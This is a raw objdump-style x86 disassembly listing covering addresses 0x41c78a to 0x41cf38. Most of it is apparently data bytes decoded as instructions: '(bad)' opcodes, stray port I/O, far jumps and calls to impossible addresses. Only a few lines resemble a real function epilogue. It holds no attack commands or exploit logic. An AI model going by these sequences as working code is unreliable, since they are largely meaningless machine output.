  41c78a:	cmp    ecx,DWORD PTR [ebx+esi*2+0x23]
  41c78e:	or     BYTE PTR [edi-0x4fa2d5b],bh
  41c794:	pop    ecx
  41c795:	cmp    DWORD PTR [ecx-0x28240afe],0xffffffe6
  41c79c:	and    eax,0x84eae9a4
  41c7a1:	push   edi
  41c7a2:	ds iret 
  41c7a4:	mov    eax,0xa7837327
  41c7a9:	xor    ch,dl
  41c7ab:	test   eax,0x78dc0331
  41c7b0:	jmp    0x33d7:0x58427f2
  41c7b7:	sbb    ah,BYTE PTR [edx+0x4a]
  41c7ba:	les    ebx,FWORD PTR [edx]
  41c7bc:	hlt    
  41c7bd:	fcmovnb st,st(3)
  41c7bf:	push   ebx
  41c7c0:	inc    ecx
  41c7c1:	aaa    
  41c7c2:	rol    ah,cl
  41c7c4:	out    0x51,al
  41c7c6:	xor    eax,0x3b7fa4db
  41c7cb:	pop    esp
  41c7cc:	xchg   edi,eax
  41c7cd:	sbb    BYTE PTR [esi-0xaf30f89],ch
  41c7d3:	pusha  
  41c7d4:	push   edi
  41c7d5:	adc    BYTE PTR [ebp+0x7a],ah
  41c7d8:	ffreep st(6)
  41c7da:	(bad)  
  41c7dc:	mov    ds:0x3f5bd915,al
  41c7e1:	shr    cl,1
  41c7e3:	xor    ebp,DWORD PTR [esi+ebx*8-0x47]
  41c7e7:	je     0x41c84b
  41c7e9:	ror    BYTE PTR [ebx-0x46e49af0],cl
  41c7ef:	mov    es,ecx
  41c7f1:	in     al,dx
  41c7f2:	loope  0x41c838
  41c7f4:	(bad)  
  41c7f5:	cli    
  41c7f6:	and    ah,0x66
  41c7f9:	fcom   QWORD PTR [eax+edi*4]
  41c7fc:	stos   DWORD PTR es:[edi],eax
  41c7fd:	add    al,BYTE PTR [edx]
  41c7ff:	xor    cl,ch
  41c801:	rcr    bh,cl
  41c803:	out    0xa8,eax
  41c805:	std    
  41c806:	imul   ecx,ebp,0xffffffd3
  41c809:	inc    edi
  41c80a:	stos   BYTE PTR es:[edi],al
  41c80b:	sbb    BYTE PTR [ebx],ah
  41c80d:	mov    al,ds:0x6bee3c6e
  41c812:	xchg   edx,eax
  41c813:	(bad)  
  41c814:	mov    ds:0x1276351,eax
  41c819:	imul   ebp,DWORD PTR [edi],0x7a1d47db
  41c81f:	into   
  41c820:	loopne 0x41c884
  41c822:	cdq    
  41c823:	pop    ss
  41c824:	mov    ebx,0xdf06914a
  41c829:	and    al,BYTE PTR [eax-0x6e]
  41c82c:	mov    ch,0x7b
  41c82e:	rol    BYTE PTR [esi-0x18],1
  41c831:	jmp    0x41127f54
  41c836:	mov    DWORD PTR ds:0x6a77b3a8,esp
  41c83c:	sahf   
  41c83d:	jmp    0x8bf3:0xf2e44822
  41c844:	pop    es
  41c845:	jo     0x41c894
  41c847:	push   es
  41c848:	inc    ebx
  41c849:	jl     0x41c7e2
  41c84b:	pop    eax
  41c84c:	or     edi,DWORD PTR [ecx-0x4e117a14]
  41c852:	mov    ch,BYTE PTR [ebx-0x5301f260]
  41c858:	popa   
  41c859:	and    al,0xca
  41c85b:	mov    ebx,0x1028835d
  41c860:	(bad)  
  41c861:	in     eax,0x4a
  41c863:	adc    BYTE PTR [edx+0x3],bh
  41c866:	lods   al,BYTE PTR ds:[esi]
  41c867:	ret    
  41c868:	popa   
  41c869:	dec    ebp
  41c86a:	xchg   esi,eax
  41c86b:	sar    DWORD PTR [ebx-0x75],0x6c
  41c86f:	push   eax
  41c870:	push   es
  41c871:	push   esp
  41c872:	pushf  
  41c873:	dec    ebx
  41c874:	fistp  QWORD PTR [edi+edx*8]
  41c877:	jns    0x41c841
  41c879:	mov    eax,0xab687ddb
  41c87e:	jnp    0x41c8a7
  41c880:	test   eax,0xceb53d76
  41c885:	jmp    DWORD PTR [eax]
  41c887:	dec    ebp
  41c888:	lods   al,BYTE PTR ds:[esi]
  41c889:	mov    esi,0xb568563d
  41c88e:	and    BYTE PTR [ebp+0x52],ch
  41c891:	push   cs
  41c892:	cmp    edi,DWORD PTR [eax+edx*4]
  41c895:	pop    ebx
  41c896:	dec    DWORD PTR [ebx]
  41c898:	jecxz  0x41c86f
  41c89a:	out    dx,eax
  41c89b:	jmp    0xc145b944
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x3efd88e2
  41c8c2:	pop    edi
  41c8c3:	inc    edi
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [ebp-0x74000000],ch
  41c8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8ce:	imul   eax,DWORD PTR [esi-0x12],0xa461d69a
  41c8d5:	std    
  41c8d6:	adc    dl,BYTE PTR [edx+0x78]
  41c8d9:	(bad)  
  41c8da:	cmc    
  41c8db:	dec    ebp
  41c8dc:	sbb    edx,DWORD PTR [eax+0x644f2426]
  41c8e2:	imul   esp,DWORD PTR [eax],0x4c
  41c8e5:	mov    DWORD PTR [edi+0x15946109],esi
  41c8eb:	jno    0x41c915
  41c8ed:	push   esp
  41c8ee:	dec    edi
  41c8ef:	inc    ecx
  41c8f0:	xchg   BYTE PTR [esi+0x4a],dh
  41c8f3:	dec    esp
  41c8f4:	adc    BYTE PTR fs:[ebp-0x2447d1e],0x61
  41c8fc:	dec    ecx
  41c8fd:	pop    eax
  41c8fe:	xchg   ecx,eax
  41c8ff:	ins    DWORD PTR es:[edi],dx
  41c900:	add    DWORD PTR [edx+0x50],edx
  41c903:	repnz cmp al,BYTE PTR ds:0x9e9690df
  41c90a:	dec    esi
  41c90b:	dec    esp
  41c90c:	ret    
  41c90d:	xor    eax,0x99ac8f87
  41c912:	cmp    esi,DWORD PTR [edi-0x3a]
  41c915:	mov    ds:0xda0911a1,al
  41c91a:	das    
  41c91b:	xor    esi,0xe3df835b
  41c921:	(bad)  
  41c923:	mov    ch,0xb1
  41c925:	pop    ss
  41c926:	lahf   
  41c927:	jg     0x64a9c37f
  41c92d:	imul   BYTE PTR [ecx-0x1fc23091]
  41c933:	add    eax,DWORD PTR [edx-0x2320b0e6]
  41c939:	push   cs
  41c93a:	std    
  41c93b:	xchg   edx,eax
  41c93c:	mov    esi,0x4c468f72
  41c941:	sbb    DWORD PTR [ebx-0x4c],edx
  41c944:	aaa    
  41c945:	sub    DWORD PTR [edi],0x34772f89
  41c94b:	test   BYTE PTR [edi+0x3c056bcd],cl
  41c951:	aad    0x14
  41c953:	pop    ecx
  41c954:	cdq    
  41c955:	mov    bh,0x48
  41c957:	mov    ah,0x4a
  41c959:	xchg   cl,dh
  41c95b:	fisttp WORD PTR [esi]
  41c95d:	xor    dl,BYTE PTR fs:[ecx-0x69]
  41c961:	gs daa 
  41c963:	rcl    BYTE PTR [ebx],1
  41c965:	cmp    eax,0xacc262b5
  41c96a:	(bad)  
  41c96b:	xor    eax,0x292658f5
  41c970:	rcr    edx,1
  41c972:	bnd jmp 0x41c93c
  41c975:	jl     0x41c916
  41c977:	push   esp
  41c978:	pushf  
	...
  41c981:	add    BYTE PTR [eax],al
  41c983:	add    cl,dl
  41c985:	sub    al,0x14
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0xbd2e0e4d
  41c994:	pop    esp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebp-0x26000000],ch
  41c99d:	popa   
  41c99e:	pop    edx
  41c99f:	jmp    0x41c942
  41c9a1:	inc    esp
  41c9a2:	(bad)  [ebx+0x11961ab7]
  41c9a8:	inc    BYTE PTR [eax]
  41c9aa:	add    ecx,DWORD PTR [ecx-0x10]
  41c9ad:	dec    ebp
  41c9ae:	jno    0x41c967
  41c9b0:	cmp    ah,dl
  41c9b2:	icebp  
  41c9b3:	jmp    0xa632a69b
  41c9b8:	ja     0x41c972
  41c9ba:	popw   ss
  41c9bc:	ins    DWORD PTR es:[edi],dx
  41c9bd:	popa   
  41c9be:	sub    bl,ch
  41c9c0:	pop    eax
  41c9c1:	icebp  
  41c9c2:	outs   dx,DWORD PTR ds:[esi]
  41c9c3:	ret    0xc47d
  41c9c6:	out    dx,al
  41c9c7:	push   ebp
  41c9c8:	arpl   dx,ax
  41c9ca:	fcomp  DWORD PTR [esi]
  41c9cc:	jle    0x41ca24
  41c9ce:	rol    DWORD PTR [edx],0x14
  41c9d1:	adc    eax,0xe9284557
  41c9d6:	es (bad) 
  41c9d8:	(bad)  
  41c9d9:	cdq    
  41c9da:	std    
  41c9db:	cdq    
  41c9dc:	lds    eax,FWORD PTR [ecx+0x7d23728b]
  41c9e2:	fwait
  41c9e3:	stc    
  41c9e4:	cmp    ebp,DWORD PTR [ecx+0x5535308f]
  41c9ea:	mov    eax,ds:0xccc1c21a
  41c9ef:	in     eax,0xc4
  41c9f1:	inc    DWORD PTR [ebx]
  41c9f3:	retf   0xb564
  41c9f6:	mov    BYTE PTR [eax+0x2d],bl
  41c9f9:	adc    al,0x46
  41c9fb:	xor    esi,DWORD PTR [ecx+0x6d]
  41c9fe:	and    bh,BYTE PTR [ebp-0x7ca1736b]
  41ca04:	mov    dh,0x6e
  41ca06:	adc    BYTE PTR [edx],dl
  41ca08:	xchg   DWORD PTR [edi],edi
  41ca0a:	das    
  41ca0b:	mov    esi,0xed4ddf47
  41ca10:	dec    edx
  41ca11:	mov    ecx,0x1abb5346
  41ca16:	mov    esp,0x542a14d9
  41ca1b:	or     BYTE PTR [edi],al
  41ca1d:	jg     0x41ca76
  41ca1f:	dec    ebp
  41ca20:	mov    ds:0x57853f8a,eax
  41ca25:	sar    DWORD PTR [eax-0x65],0x14
  41ca29:	out    0xf1,al
  41ca2b:	push   0xffffffb0
  41ca2d:	lock loopne 0x41ca58
  41ca30:	or     eax,0x9e09588b
  41ca35:	cmp    eax,0x1058f041
  41ca3a:	adc    bl,BYTE PTR [edi+ebx*2]
  41ca3d:	push   0x1b28d927
  41ca42:	dec    ebp
  41ca43:	jge    0x41ca7b
  41ca45:	xchg   BYTE PTR [ebx+0x3ff8],ch
	...
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x499c0818],0x9
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebp+0x3f000000],ch
  41ca6d:	xchg   ebp,eax
  41ca6e:	xchg   esi,eax
  41ca6f:	xchg   ebp,eax
  41ca70:	mov    edi,0xe6bfd87d
  41ca75:	xchg   edx,eax
  41ca76:	lahf   
  41ca77:	fdiv   st,st(2)
  41ca79:	adc    al,0x10
  41ca7b:	fcom   DWORD PTR [eax-0x10e7f077]
  41ca81:	sbb    DWORD PTR [ecx+0x7a1f7553],esp
  41ca87:	out    0xff,al
  41ca89:	and    bh,dh
  41ca8b:	aad    0x49
  41ca8d:	popa   
  41ca8e:	or     edx,DWORD PTR [edx-0x78]
  41ca91:	dec    eax
  41ca92:	loopne 0x41caa1
  41ca94:	and    ah,al
  41ca96:	pop    esp
  41ca97:	adc    esp,eax
  41ca99:	dec    DWORD PTR [ecx]
  41ca9b:	xor    edx,esp
  41ca9d:	cmp    al,0xdf
  41ca9f:	fcomp  QWORD PTR [ebp-0x7f]
  41caa2:	inc    ebx
  41caa3:	and    dh,BYTE PTR cs:[esi+0x7a]
  41caa7:	mov    esp,0xc19d8305
  41caac:	mov    esi,eax
  41caae:	and    BYTE PTR [ecx-0x5f59eb0d],bh
  41cab4:	sbb    eax,0xd968840
  41cab9:	call   0xdcba7007
  41cabe:	in     eax,dx
  41cabf:	ins    BYTE PTR es:[edi],dx
  41cac0:	ins    DWORD PTR es:[edi],dx
  41cac1:	sbb    BYTE PTR [esi+0x61c86c69],ch
  41cac7:	iret   
  41cac8:	fld    TBYTE PTR [esi+ebx*8+0x16]
  41cacc:	loopne 0x41cada
  41cace:	mov    dh,0x6b
  41cad0:	sbb    BYTE PTR [edi+0x74],bh
  41cad3:	add    eax,0x9d47f755
  41cad8:	adc    al,0x63
  41cada:	xchg   ecx,eax
  41cadb:	das    
  41cadc:	and    ah,bl
  41cade:	sub    esi,DWORD PTR [esi]
  41cae0:	add    eax,DWORD PTR [ebp+0x11]
  41cae3:	jmp    0x41caf8
  41cae5:	ss pop esp
  41cae7:	fist   DWORD PTR ss:[edx+0x625dc87a]
  41caee:	fistp  WORD PTR [ebx-0x58]
  41caf1:	xchg   ecx,eax
  41caf2:	or     ch,BYTE PTR [ebp+0x2a]
  41caf5:	cld    
  41caf6:	add    cl,dl
  41caf8:	mov    eax,0xb88d8e83
  41cafd:	cmp    DWORD PTR [eax],0x16
  41cb00:	lods   al,BYTE PTR ds:[esi]
  41cb01:	jnp    0x41cb12
  41cb03:	jecxz  0x41cb0c
  41cb05:	inc    edx
  41cb06:	mov    eax,0xb6c3dd9d
  41cb0b:	jmp    0x41cae2
  41cb0d:	fnstcw WORD PTR [esi+0x4f]
  41cb10:	pushw  cs
  41cb12:	in     eax,0x34
  41cb14:	inc    ebp
  41cb15:	mov    dl,0x1
  41cb17:	xchg   BYTE PTR [edi+0x0],ah
	...
  41cb22:	add    BYTE PTR [eax],al
  41cb24:	das    
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	fild   WORD PTR [esi]
  41cb32:	pop    esi
  41cb33:	xor    DWORD PTR [esi-0x52fffe79],0x0
  41cb3a:	add    BYTE PTR [eax],al
  41cb3c:	cld    
  41cb3d:	in     eax,dx
  41cb3e:	(bad)  
  41cb3f:	out    dx,al
  41cb40:	dec    esi
  41cb41:	(bad)  
  41cb42:	out    dx,eax
  41cb43:	inc    esi
  41cb44:	loop   0x41caf5
  41cb46:	dec    edi
  41cb47:	inc    ebp
  41cb48:	xchg   esi,eax
  41cb49:	pop    ecx
  41cb4a:	push   esi
  41cb4b:	sub    eax,0x91c4be44
  41cb50:	ins    BYTE PTR es:[edi],dx
  41cb51:	sbb    esp,DWORD PTR [esp+ecx*8]
  41cb54:	jo     0x41cb02
  41cb56:	aam    0xee
  41cb58:	ja     0x41cae2
  41cb5a:	xor    BYTE PTR [edi-0x522b8efc],cl
  41cb60:	(bad)  
  41cb61:	cmp    cl,BYTE PTR [edi-0xc]
  41cb64:	rcr    DWORD PTR [eax-0x50],0x84
  41cb68:	lds    esi,FWORD PTR [esi-0x7650b46]
  41cb6e:	inc    edi
  41cb6f:	jns    0x41caf4
  41cb71:	or     BYTE PTR [edx+0x7aea71a3],bl
  41cb77:	nop
  41cb78:	nop
  41cb79:	in     al,0xfb
  41cb7b:	xchg   esi,eax
  41cb7c:	int    0xdd
  41cb7e:	mov    ecx,0x4314bc62
  41cb83:	in     al,0xc7
  41cb85:	(bad)  
  41cb87:	sbb    al,BYTE PTR ds:0x9991f775
  41cb8d:	push   ebx
  41cb8e:	sub    eax,DWORD PTR ds:0x4ba82873
  41cb94:	aad    0x5
  41cb96:	test   al,0x64
  41cb98:	pop    es
  41cb99:	stc    
  41cb9a:	sub    al,ch
  41cb9c:	in     al,dx
  41cb9d:	jne    0x41cba2
  41cb9f:	adc    BYTE PTR [ecx+0x74],bl
  41cba2:	nop
  41cba3:	in     eax,0x3
  41cba5:	scas   eax,DWORD PTR es:[edi]
  41cba6:	fisttp WORD PTR [ebp-0x2e]
  41cba9:	xchg   ecx,eax
  41cbaa:	test   DWORD PTR [edx],eax
  41cbac:	pop    es
  41cbad:	xchg   edx,eax
  41cbae:	xlat   BYTE PTR ds:[ebx]
  41cbaf:	cmp    eax,0x95ae3db1
  41cbb4:	xor    al,0xad
  41cbb6:	out    0x7b,al
  41cbb8:	cmp    DWORD PTR [eax+0x655ad5c3],edi
  41cbbe:	test   eax,0x7593aa72
  41cbc3:	xchg   ecx,eax
  41cbc4:	and    al,0xb5
  41cbc6:	out    dx,eax
  41cbc7:	pop    ecx
  41cbc8:	push   0xffffff92
  41cbca:	stos   BYTE PTR es:[edi],al
  41cbcb:	dec    ebp
  41cbcc:	add    esi,DWORD PTR [ecx-0x1b]
  41cbcf:	imul   ebp,DWORD PTR [ecx-0x1e],0xd175fd0a
  41cbd6:	xchg   esp,eax
  41cbd7:	add    al,bh
  41cbd9:	scas   al,BYTE PTR es:[edi]
  41cbda:	sub    DWORD PTR [ecx+edi*8],ecx
  41cbdd:	call   0x6beba03e
  41cbe2:	pop    ecx
  41cbe3:	iret   
  41cbe4:	add    eax,0xafa98184
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x257ee5d4,al
  41cc04:	arpl   WORD PTR [eax+0xad0001],cx
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	dec    ebx
  41cc0d:	repnz inc edi
  41cc0f:	out    dx,al
  41cc10:	sub    edx,eax
  41cc12:	(bad)  
  41cc14:	mov    dh,0xb9
  41cc16:	fisub  DWORD PTR [ebp+0x7f53adba]
  41cc1c:	std    
  41cc1d:	adc    al,0x23
  41cc1f:	pop    ecx
  41cc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc21:	sbb    eax,edx
  41cc23:	mov    edx,0xcd645ebb
  41cc28:	xor    eax,0x81f0282c
  41cc2d:	je     0x41cbdf
  41cc2f:	cmp    DWORD PTR [ebp-0x70],esp
  41cc32:	pop    ds
  41cc33:	pop    es
  41cc34:	repnz cmp DWORD PTR ds:0x28313223,edx
  41cc3b:	and    dl,dh
  41cc3d:	sar    DWORD PTR [eax-0x2e858763],cl
  41cc43:	test   eax,0xe189df12
  41cc48:	out    dx,eax
  41cc49:	adc    DWORD PTR [esi-0x1a],0x62
  41cc4d:	or     eax,0x98caa4e0
  41cc52:	or     bh,BYTE PTR [ecx+0x164ac594]
  41cc58:	das    
  41cc59:	test   al,0x27
  41cc5b:	dec    eax
  41cc5c:	div    BYTE PTR [ebx]
  41cc5e:	stos   DWORD PTR es:[edi],eax
  41cc5f:	test   BYTE PTR [ecx+ebx*8+0x3fcb422d],ah
  41cc66:	sbb    ecx,0xfffffff3
  41cc69:	mov    ah,0x36
  41cc6b:	cmc    
  41cc6c:	mov    fs,WORD PTR [eax]
  41cc6e:	test   BYTE PTR ds:[ebp-0x47],0x1c
  41cc73:	idiv   BYTE PTR [ecx-0x5b]
  41cc76:	shl    esi,0xd1
  41cc79:	and    eax,0xb63335b6
  41cc7e:	lahf   
  41cc7f:	pop    ecx
  41cc80:	aad    0x8b
  41cc82:	pushf  
  41cc83:	xor    eax,ebx
  41cc85:	icebp  
  41cc86:	mov    WORD PTR [ebx+edx*4],ds
  41cc89:	outs   dx,DWORD PTR ds:[esi]
  41cc8a:	mov    bh,0x6e
  41cc8c:	pusha  
  41cc8d:	push   ecx
  41cc8e:	push   esp
  41cc8f:	ja     0x41ccbb
  41cc91:	in     eax,dx
  41cc92:	mov    ebp,0x46b82eba
  41cc97:	mov    ebp,0x91c53ce7
  41cc9c:	and    ebx,ecx
  41cc9e:	into   
  41cc9f:	call   0x3ad:0x88d1d365
  41cca6:	ja     0x41ccf5
  41cca8:	shl    BYTE PTR [edi+0x55],0xc5
  41ccac:	inc    esi
  41ccad:	aaa    
  41ccae:	xchg   esp,eax
  41ccaf:	(bad)  
  41ccb0:	jmp    0x15e5118f
  41ccb5:	mov    DWORD PTR [ecx+0x6c59],edx
	...
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	js     0x41cc92
  41ccd2:	retf   0x1091
  41ccd5:	mov    DWORD PTR [ecx],eax
  41ccd7:	add    BYTE PTR [ebp+0x45000000],ch
  41ccdd:	sub    BYTE PTR [eax+0x24ea8c46],dh
  41cce3:	jmp    0x41cc9f
  41cce5:	sbb    eax,0x4eaa8455
  41ccea:	mov    eax,0x70e21d82
  41ccef:	ret    
  41ccf0:	sub    al,al
  41ccf2:	pop    ecx
  41ccf3:	sub    DWORD PTR [edx+0x60],0x9c93c222
  41ccfa:	popf   
  41ccfb:	xchg   edx,eax
  41ccfc:	xor    al,0x7d
  41ccfe:	call   0x2c644ef0
  41cd03:	xchg   edi,eax
  41cd04:	dec    ecx
  41cd05:	pop    eax
  41cd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd07:	push   cs
  41cd08:	lock pop eax
  41cd0a:	jg     0x41cd56
  41cd0c:	dec    ebp
  41cd0d:	int3   
  41cd0e:	add    BYTE PTR [esi-0x47],0xf8
  41cd12:	test   DWORD PTR [ebx],ebp
  41cd14:	out    dx,eax
  41cd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd16:	sub    BYTE PTR [ecx+0x7f1c500a],0x40
  41cd1d:	mov    DWORD PTR [esi+0x430c3a70],esi
  41cd23:	mov    cl,0x4
  41cd25:	xor    al,0xf0
  41cd27:	retf   0x9748
  41cd2a:	jmp    0x41cd93
  41cd2c:	xor    BYTE PTR [ebp+0x1a935040],dl
  41cd32:	jge    0x41cd6c
  41cd34:	xchg   ebp,eax
  41cd35:	out    0xc7,al
  41cd37:	mov    BYTE PTR [ecx],cl
  41cd39:	mov    ds:0xa5a8c314,eax
  41cd3e:	pop    ebx
  41cd3f:	out    dx,al
  41cd40:	sub    al,0x33
  41cd42:	iret   
  41cd43:	cmc    
  41cd44:	fisttp QWORD PTR [ebx-0x54099307]
  41cd4a:	mov    dl,0xf9
  41cd4c:	mov    ds:0x977773b5,eax
  41cd51:	mov    eax,ds:0x31f71767
  41cd56:	(bad)  
  41cd57:	(bad)  
  41cd59:	and    ebx,DWORD PTR [esi+0x1c]
  41cd5c:	lds    ecx,FWORD PTR [edx]
  41cd5e:	fucom  st(7)
  41cd60:	xchg   esi,eax
  41cd61:	jmp    0xc110497f
  41cd66:	inc    ebx
  41cd67:	lods   al,BYTE PTR ds:[esi]
  41cd68:	call   0xea19:0x2f3e8113
  41cd6f:	inc    edx
  41cd70:	scas   eax,DWORD PTR es:[edi]
  41cd71:	test   DWORD PTR [esi+0x6f],ebx
  41cd74:	mov    al,ds:0xa82798e4
  41cd79:	out    0xb8,al
  41cd7b:	pop    edx
  41cd7c:	add    edx,ebp
  41cd7e:	or     dh,BYTE PTR [ecx]
  41cd80:	mov    ah,0xb3
  41cd82:	aas    
  41cd83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd84:	jge    0x41cdb1
  41cd86:	retf   
  41cd87:	push   ecx
  41cd88:	jge    0x41cd8a
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xcb6a4e09
  41cda1:	out    dx,al
  41cda2:	in     eax,0x66
  41cda4:	mov    ebp,0xad000189
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [edx+0x2a14bd7e],ah
  41cdb1:	xchg   edx,eax
  41cdb2:	fcmovnbe st,st(3)
  41cdb4:	icebp  
  41cdb5:	pop    ecx
  41cdb6:	inc    edx
  41cdb7:	or     BYTE PTR [esi+0x5d],0x81
  41cdbb:	nop
  41cdbc:	out    dx,eax
  41cdbd:	shr    BYTE PTR [ecx+0x6dd05429],0xa7
  41cdc4:	mov    cl,0xf6
  41cdc6:	outs   dx,BYTE PTR ds:[esi]
  41cdc7:	outs   dx,DWORD PTR ds:[esi]
  41cdc8:	adc    al,0xc
  41cdca:	scas   al,BYTE PTR es:[edi]
  41cdcb:	cmp    DWORD PTR [edx],0xfffffff6
  41cdce:	mov    al,ds:0xfd9bd39
  41cdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd4:	pop    esp
  41cdd5:	mov    ecx,0xb29637e8
  41cdda:	popa   
  41cddb:	popa   
  41cddc:	sbb    DWORD PTR [ecx+0x1c83472],ebp
  41cde2:	ret    0x5199
  41cde5:	shr    BYTE PTR [ecx-0x59],0xa8
  41cde9:	jmp    0xc21e:0x94fb95ee
  41cdf0:	test   ah,ch
  41cdf2:	sub    edx,DWORD PTR [ebx]
  41cdf4:	xor    dl,BYTE PTR [edi+0x1176ec49]
  41cdfa:	inc    eax
  41cdfb:	mov    al,ds:0xe036d9c2
  41ce00:	out    dx,al
  41ce01:	sub    al,0x7f
  41ce03:	jmp    0x2c02:0x46229322
  41ce0a:	xor    BYTE PTR [esi+0x28],dh
  41ce0d:	jecxz  0x41cda5
  41ce0f:	ds pop ebx
  41ce11:	call   0x61045456
  41ce16:	mov    edi,0x6982c6a9
  41ce1b:	int    0x29
  41ce1d:	popa   
  41ce1e:	arpl   sp,bp
  41ce20:	or     BYTE PTR [ebp+0x2708205f],al
  41ce26:	(bad)  
  41ce27:	mov    edx,0x5d0e17bb
  41ce2c:	in     al,dx
  41ce2d:	fiadd  DWORD PTR [ebp+eax*2-0x2486cbaf]
  41ce34:	pop    eax
  41ce35:	ins    DWORD PTR es:[edi],dx
  41ce36:	cdq    
  41ce37:	loope  0x41ce45
  41ce39:	cmp    edx,eax
  41ce3b:	dec    edi
  41ce3c:	jle    0x41cde7
  41ce3e:	add    ch,BYTE PTR [ebx+0x7cfb4f55]
  41ce44:	and    al,0xab
  41ce46:	or     dh,bl
  41ce48:	jmp    0xaaac:0x3c1392a4
  41ce4f:	and    esp,DWORD PTR [edi+0x2191f6d7]
  41ce55:	dec    esi
  41ce56:	xchg   ecx,eax
  41ce57:	mov    eax,ds:0xe2
	...
  41ce64:	dec    ecx
  41ce65:	inc    esi
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	push   0x54
  41ce72:	pop    edx
  41ce73:	inc    esp
  41ce74:	xchg   DWORD PTR [ebx+0xad0001],ebp
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	push   ebp
  41ce7d:	inc    di
  41ce7f:	pop    esi
  41ce80:	test   DWORD PTR [edi-0x59db7c1a],eax
  41ce86:	xchg   ecx,eax
  41ce87:	xchg   esp,eax
  41ce88:	xor    DWORD PTR [edx],ebp
  41ce8a:	and    esi,DWORD PTR [ecx-0x43]
  41ce8d:	xor    al,dl
  41ce8f:	cmp    eax,0x7842a180
  41ce94:	mov    cl,0x25
  41ce96:	icebp  
  41ce97:	add    al,0x5
  41ce99:	xor    DWORD PTR [esi+0x8d752e7],eax
  41ce9f:	out    0xac,eax
  41cea1:	sbb    eax,DWORD PTR [ebp+0x0]
  41cea4:	stos   DWORD PTR es:[edi],eax
  41cea5:	adc    eax,esi
  41cea7:	mov    al,0x43
  41cea9:	mov    cl,0xca
  41ceab:	jnp    0x41ce63
  41cead:	mov    bh,0x4f
  41ceaf:	(bad)  
  41ceb0:	sar    al,cl
  41ceb2:	(bad)  
  41ceb3:	scas   al,BYTE PTR es:[edi]
  41ceb4:	mov    edx,0x6855a904
  41ceb9:	mov    bh,0xf7
  41cebb:	sub    eax,0x5030f14c
  41cec0:	pop    esp
  41cec1:	push   edi
  41cec2:	pop    ss
  41cec3:	je     0x41cecc
  41cec5:	repnz pop ds
  41cec7:	std    
  41cec8:	inc    eax
  41cec9:	mov    dl,0xac
  41cecb:	push   es
  41cecc:	adc    DWORD PTR [edx],0x12
  41cecf:	mov    esp,0xa3ba865f
  41ced4:	rcl    DWORD PTR [ecx],cl
  41ced6:	fnstsw WORD PTR [ebp-0x54]
  41ced9:	addr16 popa 
  41cedb:	cdq    
  41cedc:	shl    esi,0xa5
  41cedf:	or     esi,edx
  41cee1:	pop    ebp
  41cee2:	sbb    eax,0xc50b8747
  41cee7:	test   al,0x86
  41cee9:	mov    ecx,es
  41ceeb:	pop    ebp
  41ceec:	call   0xa272d7dd
  41cef1:	popa   
  41cef2:	(bad)  
  41cef3:	in     eax,0xc5
  41cef5:	and    DWORD PTR [eax-0x521b3029],edi
  41cefb:	mov    ebx,0x9499f02
  41cf00:	loope  0x41ce9e
  41cf02:	out    dx,al
  41cf03:	imul   eax,DWORD PTR [eax+0x47],0xe3f916c0
  41cf0a:	jne    0x41cf7b
  41cf0c:	sbb    DWORD PTR [ecx+0x211c4154],esp
  41cf12:	sub    BYTE PTR [ecx+0x355efb38],0x2e
  41cf19:	je     0x41cf89
  41cf1b:	gs sbb ah,ah
  41cf1e:	fldenv [edi-0x2d4bc5c6]
  41cf24:	stos   DWORD PTR es:[edi],eax
  41cf25:	mov    fs,edx
  41cf27:	pop    ss
  41cf28:	mov    bl,0x0
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	addr16 (bad) 
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
